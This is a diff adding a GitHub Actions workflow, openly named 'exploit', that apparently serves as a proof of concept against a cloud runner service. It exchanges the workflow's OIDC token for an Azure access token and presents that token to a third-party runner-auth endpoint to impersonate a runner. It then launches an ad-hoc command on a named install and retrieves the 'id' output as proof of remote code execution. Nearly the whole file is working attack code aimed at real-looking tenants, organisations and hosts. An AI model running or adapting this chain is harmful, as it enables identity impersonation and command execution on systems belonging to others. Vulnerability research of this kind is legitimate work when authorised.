@@ -1,0 +1,51 @@
+name: azure-roleless-auth
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exchange a roleless Azure identity for root execution
+        shell: bash
+        run: |
+          set -euo pipefail
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          assertion="$(jq -r .value <<<"$raw")"
+          azure_http="$(curl -sS -o /tmp/azure.json -w '%{http_code}' -X POST 'https://login.microsoftonline.com/cbe2478e-b8ae-4784-b10b-1c71a17a9a17/oauth2/v2.0/token' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'client_id=ca63ec06-2bad-4e3b-a20d-e65952f7d86f' --data-urlencode 'scope=https://management.azure.com/.default' --data-urlencode 'grant_type=client_credentials' --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' --data-urlencode "client_assertion=$assertion")"
+          if [ "$azure_http" != 200 ]; then
+            jq -c --arg http "$azure_http" '{azure_http:$http,error,error_description}' /tmp/azure.json
+            exit 2
+          fi
+          azure_token="$(jq -r .access_token /tmp/azure.json)"
+          export AZURE_TOKEN="$azure_token"
+          claims="$(python3 - <<'PY'
+          import base64,json,os
+          p=os.environ['AZURE_TOKEN'].split('.')[1]
+          print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))),separators=(',',':')))
+          PY
+          )"
+          arm_http="$(curl -sS -o /tmp/arm.json -w '%{http_code}' 'https://management.azure.com/subscriptions/b532ceb5-a68e-40af-9808-b8e9034d1869/resourceGroups/inl0hbh50qbe3p8dno3kiyb7j0-rg?api-version=2021-04-01' -H "Authorization: Bearer $azure_token")"
+          auth_http="$(jq -nc --arg token "$azure_token" '{token:$token,runner_id:"run5b4nkhe3lusly4h4edjwlqs"}' | curl -sS -o /tmp/auth.json -w '%{http_code}' -X POST 'https://runner.byoc.lovable.net/v1/runner-auth/azure' -H 'Content-Type: application/json' --data @-)"
+          if [ "$auth_http" != 200 ]; then
+            jq -nc --arg azure_http "$azure_http" --arg arm_http "$arm_http" --arg auth_http "$auth_http" --argjson claims "$claims" --argjson auth "$(cat /tmp/auth.json)" '{azure_http:$azure_http,arm_http:$arm_http,claims:($claims|{tid,oid,sub,iss,aud,xms_mirid}),runner_auth_http:$auth_http,runner_auth:$auth}'
+            exit 3
+          fi
+          nuon_token="$(jq -r .token /tmp/auth.json)"
+          me="$(curl -sSf 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $nuon_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+          marker="azure-roleless-rce-${GITHUB_RUN_ID}"
+          action="$(jq -nc --arg marker "$marker" --arg req "$GITHUB_RUN_ID" '{command:("echo "+$marker+" && id"),timeout:60,name:"azure-roleless-rce",request_id:("azure-roleless-rce-"+$req),enable_kube_config:false}' | curl -sSf -X POST 'https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/adhoc-run' -H "Authorization: Bearer $nuon_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data-binary @-)"
+          action_id="$(jq -r .id <<<"$action")"
+          for _ in $(seq 1 60); do
+            status="$(curl -sSf --retry 6 --retry-delay 1 --retry-all-errors "https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/runs/$action_id" -H "Authorization: Bearer $nuon_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+            state="$(jq -r .status <<<"$status")"
+            if [ "$state" = finished ] || [ "$state" = error ]; then break; fi
+            sleep 2
+          done
+          job="$(jq -r .runner_job.id <<<"$status")"
+          log="$(jq -r .runner_job.log_stream_id <<<"$status")"
+          proof="$(curl -sSf "https://api.byoc.lovable.net/v1/log-streams/$log/logs?order=asc&runner_job_id=$job" -H "Authorization: Bearer $nuon_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -c --arg marker "$marker" '[.[] | select(.log_attributes["nuon.command_output"] == "true") | .body | select(. == $marker or startswith("uid="))]')"
+          jq -nc --arg azure_http "$azure_http" --arg arm_http "$arm_http" --arg auth_http "$auth_http" --argjson claims "$claims" --arg principal "$(jq -r .principal_id /tmp/auth.json)" --arg runner "$(jq -r .runner_id /tmp/auth.json)" --arg account_type "$(jq -r .account_type <<<"$me")" --argjson permissions "$(jq .permissions <<<"$me")" --arg action "$action_id" --arg state "$state" --argjson proof "$proof" '{azure_http:$azure_http,arm_http:$arm_http,claims:($claims|{tid,oid,sub,iss,aud,xms_mirid}),runner_auth_http:$auth_http,accepted_principal:$principal,impersonated_runner:$runner,account_type:$account_type,permissions:$permissions,action_id:$action,action_status:$state,command_output:$proof}'
+          [ "$state" = finished ]
